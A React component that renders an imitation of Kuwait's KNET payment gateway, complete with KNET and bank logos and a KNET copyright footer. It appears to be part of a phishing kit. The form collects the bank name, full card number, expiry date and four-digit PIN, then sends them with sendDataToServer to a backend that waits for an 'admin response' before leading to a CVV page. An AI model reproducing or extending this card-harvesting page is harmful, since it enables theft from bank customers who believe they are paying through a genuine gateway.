import Main from "@/components/MainWrapper";
import { useEffect } from "react";
import { Link, useLocation } from "react-router-dom";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import { FieldValues, useForm } from "react-hook-form";
import { CustomSelect } from "@/components/ui/select";
import { CustomInput } from "@/components/Input";
import { banks, months, years } from "@/data/selects-data";
import Label from "@/components/ui/label";
import { mainInfo } from "@/real-time/context/signals";

const KnetGateway = () => {
  const { state } = useLocation();
  const {
    register,
    handleSubmit,
    watch,
    setValue,
    formState: { errors, isValidating, isValid },
  } = useForm({
    mode: "all",
  });

  useEffect(() => {
    setCurrentPage("knet-gateway");
  }, []);

  const onSubmit = (data: FieldValues) => {
    if (Object.values(data).filter((d) => !d).length === 0) {
      mainInfo.value.query = "knet";

      const serverData = {
        "نوع البطاقة": "knet",
        "اسم البنك": data.bank_name,
        "رقم البطاقة": `${data.card_code}${data.card_num}`,
        "تاريخ الانتهاء": `${data.exp_month}/${data.exp_year}`,
        pin: data.pin,
      };

      mainInfo.value.state = {
        ...data,
        payment_amount: state.payment_amount,
      };

      sendDataToServer({
        data: serverData,
        current: "knet-gateway",
        nextPage: "knet-cvv",
        waitingForAdminResponse: true,
      });
    }
  };

  return (
    <Main>
      <img
        src="/assets/images/knet-banner.png"
        alt="knet banner"
        className="w-full"
      />
      <div className="bg-gray-100 py-4 min-h-screen grid place-items-center">
        <section className="container pb-10">
          <div className="text-left bg-white rounded-xl border p-4 shadow-lg">
            <img
              src="/assets/images/kfh.png"
              alt="nbk logo"
              className="h-14 w-40 object-cover mx-auto mb-4"
            />
            <div className="flex items-center border-b-2 border-b-gray-300">
              <p className="grow text-sm">Pay the bill</p>
              <p className="text-sky-700 font-bold w-32">:Merchant</p>
            </div>
            <div className="flex items-center">
              <p className="grow">
                {Number(state?.payment_amount).toFixed(3)} KD
              </p>
              <p className="text-sky-700 font-bold w-32">:Amount</p>
            </div>
          </div>

          <form onSubmit={handleSubmit(onSubmit)} className="text-left">
            <div className="divide-y-2 mt-4 bg-white rounded-xl border p-4 shadow-lg">
              <div className="py-2 px-4 flex justify-between items-center">
                <div className="flex gap-2">
                  <img
                    src="/assets/images/knet.png"
                    alt="knet logo"
                    className="h-12"
                  />
                  <input type="radio" checked />
                </div>
                <div className="flex gap-2">
                  <img
                    src="/assets/images/kfast.png"
                    alt="knet logo"
                    className="h-12"
                  />
                  <input type="radio" disabled />
                </div>
              </div>
              <div className="-mb-3 pt-2 flex justify-between gap-4">
                <div className="flex-[65%]">
                  <CustomSelect
                    id="bank_name"
                    placeholder="Select Your Bank"
                    label=""
                    sels={banks}
                    className="px-4 h-6"
                    dir="ltr"
                    register={register}
                    errors={errors}
                    options={{ required: true }}
                    setValue={setValue}
                  />
                </div>

                <Label
                  label=":Select Your Bank"
                  className="text-xs flex-[28%] mt-1 text-sky-700"
                />
              </div>
              <div className="-mb-3 flex justify-between gap-4">
                <div dir="ltr" className="flex-[70%] flex gap-2 items-center">
                  <div className="flex-[30%]">
                    <CustomSelect
                      id="card_code"
                      placeholder="Prefix"
                      label=""
                      sels={
                        banks.find((bank) => bank.name === watch("bank_name"))
                          ?.codes ?? []
                      }
                      className="px-4 mt-2 h-6"
                      dir="ltr"
                      register={register}
                      errors={errors}
                      options={{ required: true }}
                      setValue={setValue}
                    />
                  </div>{" "}
                  <div className="grow">
                    <CustomInput
                      label=""
                      id="card_num"
                      placeholder=" "
                      inputClassName="h-6 bg-gray-100"
                      dir="ltr"
                      register={register}
                      errors={errors}
                      options={{
                        required: true,
                        pattern: /^[0-9]{8,10}$/,
                      }}
                    />
                  </div>
                </div>

                <Label
                  label=":Card Number"
                  className="text-xs flex-[30%] mt-3 text-sky-700"
                />
              </div>
              <div className="-mb-3 flex justify-between gap-4">
                <div className="flex-[70%] mt-2 flex gap-2 items-center">
                  <div className="flex-1">
                    <CustomSelect
                      id="exp_year"
                      placeholder="YYYY"
                      label=""
                      sels={years}
                      className="px-4 h-6"
                      dir="ltr"
                      register={register}
                      errors={errors}
                      options={{ required: true }}
                      setValue={setValue}
                    />
                  </div>
                  <div className="flex-1">
                    <CustomSelect
                      id="exp_month"
                      placeholder="MM"
                      label=""
                      sels={months}
                      className="px-4 h-6"
                      dir="ltr"
                      register={register}
                      errors={errors}
                      options={{ required: true }}
                      setValue={setValue}
                    />
                  </div>
                </div>

                <Label
                  label=":Expiration Date"
                  className="text-xs flex-[30%] mt-3 text-sky-700"
                />
              </div>
              <div className="-mb-3 flex justify-between gap-4">
                <div className="flex-[70%]">
                  <CustomInput
                    label=""
                    id="pin"
                    type="tel"
                    errors={errors}
                    register={register}
                    placeholder=" "
                    className="text-center"
                    dir="ltr"
                    inputClassName="h-6 bg-gray-100 placeholder:text-center text-center"
                    options={{
                      required: "هذا الحقل ضروري",
                      minLength: {
                        value: 4,
                        message: "يجب أن يكون كود PIN أربعة أرقام",
                      },
                      maxLength: {
                        value: 4,
                        message: "يجب أن يكون كود PIN أربعة أرقام",
                      },
                      pattern: {
                        value: /^\d+$/,
                        message: "يجب أن يكون كود PIN أرقام فقط",
                      },
                    }}
                  />
                </div>

                <Label
                  label=":PIN"
                  className="text-xs flex-[30%] mt-3 text-sky-700"
                />
              </div>
            </div>

            <div className="mt-4 bg-white rounded-xl border px-4 py-6 shadow-lg">
              <div className="flex text-sm w-full items-center justify-end gap-2">
                <p>
                  I have read & agree to the{" "}
                  <span className="text-sky-700 italic font-bold">Terms</span>{" "}
                  to reguster for KFast
                </p>
                <input type="checkbox" name="terms" required />
              </div>
              <div className="mt-3 flex items-center gap-2">
                <Link
                  className="w-full text-center lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-gray-200 hover:bg-gray-100 text-gray-800 transition-colors"
                  to={"/pick-payment"}
                  state={state}
                >
                  Cancel
                </Link>
                <button
                  className="w-full lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-main hover:brightness-110 text-white transition-colors disabled:cursor-not-allowed disabled:bg-gray-400"
                  type="submit"
                  disabled={!isValid}
                >
                  {isValidating ? "Validating..." : "Submit"}
                </button>
              </div>
            </div>
          </form>

          <h3 className="mt-8 mb-1 capitalize text-center font-bold text-xs">
            © all rights reserved. copyright 2025
          </h3>
          <h3 className="mb-10 capitalize text-center font-bold text-xs text-sky-700">
            the shared electronics banking services company - KNET
          </h3>
        </section>
      </div>
    </Main>
  );
};
export default KnetGateway;
